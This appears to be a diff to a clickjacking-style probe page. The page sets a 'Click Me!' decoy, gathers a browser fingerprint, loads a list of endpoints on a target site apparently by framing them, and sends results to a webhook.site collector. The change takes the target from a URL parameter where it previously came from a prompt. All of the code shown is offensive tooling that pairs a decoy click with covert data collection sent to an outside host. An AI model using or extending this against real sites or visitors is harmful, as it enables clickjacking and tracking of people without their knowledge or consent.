@@ -59,7 +59,15 @@
   </div>
   <div id="clickTrap"> 🎯 Click Me!</div>
   <script>
-    const webhook = "https://webhook.site/YOUR-UNIQUE-ID"; // Replace with your webhook
+    const webhook = "https://webhook.site/YOUR-UNIQUE-ID"; // <-- Replace this
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const origin = urlParams.get("target");
+    if (!origin) {
+      alert("❌ Missing target URL. Add ?target=https://example.com");
+      throw new Error("Missing ?target parameter in URL");
+    }
+
     const rand = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
     const sleep = ms => new Promise(res => setTimeout(res, ms));
     const fingerprint = () => ({
@@ -167,8 +175,6 @@
     };
 
     (async () => {
-      const origin = prompt("Enter target site origin (e.g., https://example.com)");
-      if (!origin) return alert("You must provide a target URL!");
       for (const path of endpoints) {
         const fullURL = origin.replace(/\/$/, "") + path;
         await testFrame(fullURL);
